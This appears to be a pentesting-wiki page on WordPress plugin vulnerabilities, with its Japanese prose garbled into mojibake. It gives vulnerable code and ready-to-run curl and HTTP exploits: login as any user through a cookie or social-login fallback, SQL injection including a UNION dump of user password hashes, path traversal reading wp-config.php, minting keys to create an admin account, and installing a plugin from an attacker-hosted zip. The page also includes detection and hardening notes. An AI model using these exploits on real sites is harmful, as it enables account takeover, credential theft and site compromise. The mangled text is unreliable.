ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ user-switching ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’ public `init` ãƒ•ãƒƒã‚¯ã«æ¥ç¶šã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆåˆ¶å¾¡ã® cookie ã‹ã‚‰è­˜åˆ¥ã‚’å–å¾—ã—ã¾ã™ã€‚ã‚³ãƒ¼ãƒ‰ãŒèªè¨¼ã€capabilityã€ãŠã‚ˆã³æœ‰åŠ¹ãª nonce ã‚’æ¤œè¨¼ã›ãšã« `wp_set_auth_cookie()` ã‚’å‘¼ã³å‡ºã™ã¨ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„è¨ªå•è€…ãŒä»»æ„ã® user ID ã¨ã—ã¦å¼·åˆ¶ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹

- å…¬é–‹ã•ã‚ŒãŸ `init` ãƒ•ãƒƒã‚¯ã«ã‚ˆã‚Šã€ãƒãƒ³ãƒ‰ãƒ©ã¯ unauthenticated ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰åˆ°é”å¯èƒ½ã§ã™ï¼ˆ`is_user_logged_in()` ã‚¬ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚
- è­˜åˆ¥ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§å¤‰æ›´å¯èƒ½ãªã‚¯ãƒƒã‚­ãƒ¼ï¼ˆ`original_user_id`ï¼‰ã‹ã‚‰å°å‡ºã•ã‚Œã¾ã™ã€‚
- `wp_set_auth_cookie($uid)` ã‚’ç›´æ¥å‘¼ã³å‡ºã™ã¨ã€è¦æ±‚è€…ã¯ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã•ã‚Œã¾ã™ï¼ˆæ¨©é™ãƒã‚§ãƒƒã‚¯ã‚„ nonce ãƒã‚§ãƒƒã‚¯ãŒè¡Œã‚ã‚Œã¾ã›ã‚“ï¼‰ã€‚

æ‚ªç”¨ (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/plugin CVE ã«é–¢ã™ã‚‹ WAF ã®è€ƒæ…®äº‹é …

æ±ç”¨ã® edge/server WAF ã¯åºƒç¯„ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆSQLiã€XSSã€LFIï¼‰ã«åˆã‚ã›ã¦èª¿æ•´ã•ã‚Œã¦ã„ã¾ã™ã€‚å¤šãã®é«˜å½±éŸ¿ãª WordPress/plugin ã®è„†å¼±æ€§ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ãƒ­ã‚¸ãƒƒã‚¯ï¼auth ãƒã‚°ã§ã€ã‚¨ãƒ³ã‚¸ãƒ³ãŒ WordPress ã®ãƒ«ãƒ¼ãƒˆã‚„ plugin ã®ã‚»ãƒãƒ³ãƒ†ã‚£ã‚¯ã‚¹ã‚’ç†è§£ã—ã¦ã„ãªã„é™ã‚Šç„¡å®³ãªãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã«è¦‹ãˆã¾ã™ã€‚

æ”»æ’ƒãƒ¡ãƒ¢

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å›ºæœ‰ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã‚¯ãƒªãƒ¼ãƒ³ãª payloads ã§ç‹™ã†: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- ã¾ãšã¯èªè¨¼ä¸è¦ã®çµŒè·¯ã‚’è©¦ã™ï¼ˆAJAX `nopriv`, REST with permissive `permission_callback`, public shortcodesï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® payloads ã¯é›£èª­åŒ–ãªã—ã§æˆåŠŸã™ã‚‹ã“ã¨ãŒå¤šã„ã€‚
- å…¸å‹çš„ãªé«˜å½±éŸ¿ã‚±ãƒ¼ã‚¹: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

é˜²å¾¡ãƒ¡ãƒ¢

- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã® CVE ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«æ±ç”¨ WAF ã‚·ã‚°ãƒãƒãƒ£ã«é ¼ã‚‰ãªã„ã“ã¨ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å±¤ã§è„†å¼±æ€§ç‰¹åŒ–ã®ä»®ãƒ‘ãƒƒãƒã‚’å®Ÿè£…ã™ã‚‹ã‹ã€è¿…é€Ÿã«æ›´æ–°ã™ã‚‹ã€‚
- ã‚³ãƒ¼ãƒ‰å†…ã§ã¯ãƒã‚¬ãƒ†ã‚£ãƒ–ãª regex ãƒ•ã‚£ãƒ«ã‚¿ã‚ˆã‚Šã‚‚ã€ãƒã‚¸ãƒ†ã‚£ãƒ–ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ï¼ˆcapabilities, nonces, strict input validationï¼‰ã‚’å„ªå…ˆã™ã‚‹ã€‚

## WordPress ã®ä¿è­·

### å®šæœŸçš„ãªæ›´æ–°

WordPressã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€ãŠã‚ˆã³ãƒ†ãƒ¼ãƒãŒæœ€æ–°ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã¾ãŸã€wp-config.php ã§è‡ªå‹•æ›´æ–°ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **ä¿¡é ¼ã§ãã‚‹ WordPress ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ã¿ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„**ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ãã®ä»–ã®æ¨å¥¨äº‹é …**

- ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã® **admin** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã™ã‚‹
- **å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã¨**2FA**ã‚’ä½¿ç”¨ã™ã‚‹
- å®šæœŸçš„ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**æ¨©é™**ã‚’**ç¢ºèª**ã™ã‚‹
- Brute Force æ”»æ’ƒã‚’é˜²ããŸã‚ã«**ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œå›æ•°ã‚’åˆ¶é™ã™ã‚‹**
- **`wp-admin.php`** ãƒ•ã‚¡ã‚¤ãƒ«åã‚’å¤‰æ›´ã—ã€ç¤¾å†…ã¾ãŸã¯ç‰¹å®šã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã€‚

### èªè¨¼ä¸è¦ã® SQL Injectionï¼ˆä¸ååˆ†ãªæ¤œè¨¼ã«ã‚ˆã‚‹ï¼‰(WP Job Portal <= 2.3.2)

WP Job Portal ã®æ±‚äººãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ **savecategory** ã‚¿ã‚¹ã‚¯ã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€æœ€çµ‚çš„ã« `modules/category/model.php::validateFormData()` å†…ã§ä»¥ä¸‹ã®è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ã“ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã§å°å…¥ã•ã‚ŒãŸå•é¡Œ:

1. **Unsanitised user input** â€“ `parentid` ã¯ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã‚‰ãã®ã¾ã¾å–å¾—ã•ã‚Œã¾ã™ã€‚
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statement ãŒä½¿ã‚ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
3. **Unauthenticated reachability** â€“ action ã¯ `admin-post.php` çµŒç”±ã§å®Ÿè¡Œã•ã‚Œã¾ã™ãŒã€å­˜åœ¨ã™ã‚‹ãƒã‚§ãƒƒã‚¯ã¯ **CSRF nonce** (`wp_verify_nonce()`) ã®ã¿ã§ã€ä»»æ„ã®è¨ªå•è€…ãŒã‚·ãƒ§ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ `[wpjobportal_my_resumes]` ã‚’åŸ‹ã‚è¾¼ã‚“ã å…¬é–‹ãƒšãƒ¼ã‚¸ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

#### æ‚ªç”¨

1. æ–°ã—ã„ nonce ã‚’å–å¾—:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã® SQL ã‚’æ³¨å…¥:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯æ³¨å…¥ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã®çµæœã‚’é–‹ç¤ºã™ã‚‹ã‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å¤‰æ›´ã—ã€SQLi ã‚’ç«‹è¨¼ã—ã¾ã™ã€‚


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

åˆ¥ã®ã‚¿ã‚¹ã‚¯ã€**downloadcustomfile** ã«ã‚ˆã‚Šã€è¨ªå•è€…ãŒ path traversal ã‚’ä½¿ã£ã¦ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã® **ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«** ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã—ãŸã€‚è„†å¼±ãªã‚·ãƒ³ã‚¯ã¯ `modules/customfield/model.php::downloadCustomUploadedFile()` ã«ã‚ã‚Šã¾ã™:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ã¯æ”»æ’ƒè€…ã«åˆ¶å¾¡ã•ã‚Œã¦ãŠã‚Šã€**without sanitisation** ã®ã¾ã¾é€£çµã•ã‚Œã¦ã„ã¾ã™ã€‚  ç¹°ã‚Šè¿”ã—ã«ãªã‚Šã¾ã™ãŒã€å”¯ä¸€ã®é–¢é–€ã¯ resume page ã‹ã‚‰å–å¾—ã§ãã‚‹ **CSRF nonce** ã§ã™ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ã‚µãƒ¼ãƒã¯ `wp-config.php` ã®å†…å®¹ã‚’è¿”ã—ã€leaking DB credentials and auth keys.

## æœªèªè¨¼ã§ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä¹—ã£å–ã‚Š via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

å¤šãã®ãƒ†ãƒ¼ãƒ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ admin-ajax.php ã‚’ä»‹ã—ã¦å…¬é–‹ã•ã‚Œã‚‹ "social login" ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’åŒæ¢±ã—ã¦ã„ã¾ã™ã€‚æœªèªè¨¼ã® AJAX ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ (wp_ajax_nopriv_...) ãŒãƒ—ãƒ­ãƒã‚¤ãƒ€ã®ãƒ‡ãƒ¼ã‚¿ãŒæ¬ è½ã—ã¦ã„ã‚‹å ´åˆã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæä¾›ã®è­˜åˆ¥å­ã‚’ä¿¡é ¼ã—ã€ãã®å¾Œ wp_set_auth_cookie() ã‚’å‘¼ã³å‡ºã™ã¨ã€å®Œå…¨ãªèªè¨¼ãƒã‚¤ãƒ‘ã‚¹ã«ãªã‚Šã¾ã™ã€‚

å…¸å‹çš„ãªè„†å¼±ãªãƒ‘ã‚¿ãƒ¼ãƒ³ï¼ˆç°¡ç•¥åŒ–ï¼‰
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why itâ€™s exploitable

- æœªèªè¨¼ã§åˆ°é”å¯èƒ½ â€” admin-ajax.phpï¼ˆwp_ajax_nopriv_â€¦ actionï¼‰ã€‚
- çŠ¶æ…‹å¤‰æ›´ã®å‰ã« nonce/capability ãƒã‚§ãƒƒã‚¯ãŒãªã„ã€‚
- OAuth/OpenID ãƒ—ãƒ­ãƒã‚¤ãƒ€ã®æ¤œè¨¼ãŒæ¬ å¦‚ã—ã¦ã„ã‚‹ï¼›ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ãŒæ”»æ’ƒè€…ã®å…¥åŠ›ã‚’å—ã‘å…¥ã‚Œã‚‹ã€‚
- get_user_by('email', $_POST['id']) ã®å¾Œã« wp_set_auth_cookie($uid) ãŒç¶šãã€è¦æ±‚è€…ã‚’ä»»æ„ã®æ—¢å­˜ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã—ã¦èªè¨¼ã—ã¦ã—ã¾ã†ã€‚

Exploitation (unauthenticated)

- Prerequisites: æ”»æ’ƒè€…ãŒ /wp-admin/admin-ajax.php ã«åˆ°é”ã§ãã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã£ã¦ã„ã‚‹ã‹æ¨æ¸¬ã§ãã‚‹ã“ã¨ã€‚
- provider ã‚’ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ãªã„å€¤ã«è¨­å®šï¼ˆã¾ãŸã¯çœç•¥ï¼‰ã—ã¦ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆ†å²ã‚’é€šã‚Šã€id=<victim_email> ã‚’æ¸¡ã™ã€‚
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€å‘¼ã³å‡ºã—å…ƒã®æ¨©é™ã‚’æ¤œè¨¼ã›ãšã«å†åˆ©ç”¨å¯èƒ½ãªã€Œconnection keysã€ã‚„ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã™ã‚‹RESTã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ã„ã¾ã™ã€‚ãƒ«ãƒ¼ãƒˆãŒæ¨æ¸¬å¯èƒ½ãªå±æ€§ï¼ˆä¾‹: usernameï¼‰ã®ã¿ã§èªè¨¼ã—ã€ã‚­ãƒ¼ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«å³å¯†ãª capability ãƒã‚§ãƒƒã‚¯ã§ç´ä»˜ã‘ãªã„å ´åˆã€æœªèªè¨¼ã®æ”»æ’ƒè€…ãŒã‚­ãƒ¼ã‚’ç™ºè¡Œã—ã¦æ¨©é™ã®ã‚ã‚‹å‡¦ç†ï¼ˆç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä½œæˆã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ç‰¹æ¨©ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ â†’ RCEï¼‰ã‚’å‘¼ã³å‡ºã›ã¾ã™ã€‚

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ãªãœæ‚ªç”¨å¯èƒ½ã‹
- æ©Ÿå¾®ãª REST ãƒ«ãƒ¼ãƒˆãŒä½ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ã®è­˜åˆ¥è¨¼æ˜ï¼ˆusernameï¼‰ã ã‘ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã€ã¾ãŸã¯ permission_callback ãŒæ¬ å¦‚ã—ã¦ã„ã‚‹
- æ¨©é™å¼·åˆ¶ãŒè¡Œã‚ã‚Œã¦ãŠã‚‰ãšã€ç™ºè¡Œã•ã‚ŒãŸã‚­ãƒ¼ãŒæ™®éçš„ãªãƒã‚¤ãƒ‘ã‚¹ã¨ã—ã¦å—ã‘å…¥ã‚Œã‚‰ã‚Œã¦ã„ã‚‹

æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- Grep ã§ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚³ãƒ¼ãƒ‰ã‚’æ¤œç´¢: register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- ãƒªã‚¯ã‚¨ã‚¹ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ï¼ˆusername/emailï¼‰ã«åŸºã¥ã„ã¦ãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’ç™ºè¡Œã—ã€èªè¨¼æ¸ˆã¿ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ capability ã«ç´ä»˜ã‘ã¦ã„ãªã„ãƒ«ãƒ¼ãƒˆ
- ç™ºè¡Œæ¸ˆã¿ã®ãƒˆãƒ¼ã‚¯ãƒ³/ã‚­ãƒ¼ã‚’ã‚µãƒ¼ãƒãƒ¼å´ã§ã®æ¨©é™ãƒã‚§ãƒƒã‚¯ãªã—ã«å—ã‘å…¥ã‚Œã‚‹å¾Œç¶šãƒ«ãƒ¼ãƒˆã‚’æ¢ã™

å¯¾ç­–
- ç‰¹æ¨©ã‚’è¦ã™ã‚‹ REST ãƒ«ãƒ¼ãƒˆã«ã¯ã€å¿…è¦ãª capability ã«å¯¾ã—ã¦ current_user_can() ã‚’å®Ÿè¡Œã™ã‚‹ permission_callback ã‚’å¿…é ˆã«ã™ã‚‹
- ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæä¾›ã®è­˜åˆ¥æƒ…å ±ã‹ã‚‰é•·æœŸé–“æœ‰åŠ¹ãªã‚­ãƒ¼ã‚’ç™ºè¡Œã—ãªã„ã€‚å¿…è¦ã§ã‚ã‚Œã°ã€èªè¨¼å¾Œã«çŸ­æœŸé–“æœ‰åŠ¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ç´ã¥ããƒˆãƒ¼ã‚¯ãƒ³ã‚’ç™ºè¡Œã—ã€ä½¿ç”¨æ™‚ã«å†åº¦ capability ã‚’ç¢ºèªã™ã‚‹
- å‘¼ã³å‡ºã—å…ƒã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ¤œè¨¼ã™ã‚‹ï¼ˆwp_set_current_user ã¯å˜ä½“ã§ã¯ä¸ååˆ†ï¼‰ã€‚!is_user_logged_in() || !current_user_can(<cap>) ã®å ´åˆã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‹’å¦ã™ã‚‹

---

## Nonce gate misuse â†’ èªè¨¼ã•ã‚Œã¦ã„ãªã„ä»»æ„ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ« (FunnelKit Automations â‰¤ 3.5.3)

Nonces ã¯ CSRF ã‚’é˜²ãã‚‚ã®ã§ã‚ã‚Šã€authorization ã‚’é˜²ãã‚‚ã®ã§ã¯ãªã„ã€‚ã‚³ãƒ¼ãƒ‰ãŒ nonce ã®æ¤œè¨¼é€šéã‚’è¨±å¯ã‚µã‚¤ãƒ³ã¨è¦‹ãªã—ã€ãã®å¾Œã«ç‰¹æ¨©æ“ä½œï¼ˆä¾‹: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«/æœ‰åŠ¹åŒ–ï¼‰ã«å¯¾ã™ã‚‹æ¨©é™ãƒã‚§ãƒƒã‚¯ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã¨ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„æ”»æ’ƒè€…ãŒå¼±ã„ nonce è¦ä»¶ã‚’æº€ãŸã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢å…¥ã‚Šã‚„è„†å¼±ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€RCE ã«è‡³ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã€‚

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## æœªèªè¨¼ã® SQLi â€” depicter-* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã® s (search) ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿çµŒç”± (Depicter Slider â‰¤ 3.6.1)

è¤‡æ•°ã® depicter-* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒ s (search) ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å—ã‘å–ã‚Šã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã›ãšã« SQL ã‚¯ã‚¨ãƒªã«é€£çµã—ã¦ã„ãŸã€‚

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®æƒ…å ±æŒã¡å‡ºã—ï¼ˆusersã€hashesï¼‰ã€æ¨ªæ–¹å‘ã¸ã®ä¾µå®³

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ
- Grepã§depicter-*ã®actionãƒãƒ³ãƒ‰ãƒ©ã¨ã€SQLå†…ã§ã®$_GET['s']ã¾ãŸã¯$_POST['s']ã®ç›´æ¥ä½¿ç”¨ã‚’æ¢ã™
- $wpdb->get_results()/query()ã«æ¸¡ã•ã‚Œã‚‹ã‚«ã‚¹ã‚¿ãƒ ã‚¯ã‚¨ãƒªã§ã€sã‚’é€£çµã—ã¦ã„ã‚‹ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹

ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°
- å¸¸ã« $wpdb->prepare() ã¾ãŸã¯ wpdb ã®ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ã‚’ä½¿ç”¨ã™ã‚‹ï¼›ã‚µãƒ¼ãƒãƒ¼å´ã§äºˆæœŸã—ãªã„ãƒ¡ã‚¿æ–‡å­—ã‚’æ‹’å¦ã™ã‚‹
- s ã«å¯¾ã—ã¦å³æ ¼ãªè¨±å¯ãƒªã‚¹ãƒˆã‚’è¿½åŠ ã—ã€æœŸå¾…ã•ã‚Œã‚‹æ–‡å­—ã‚»ãƒƒãƒˆ/é•·ã•ã«æ­£è¦åŒ–ã™ã‚‹

---

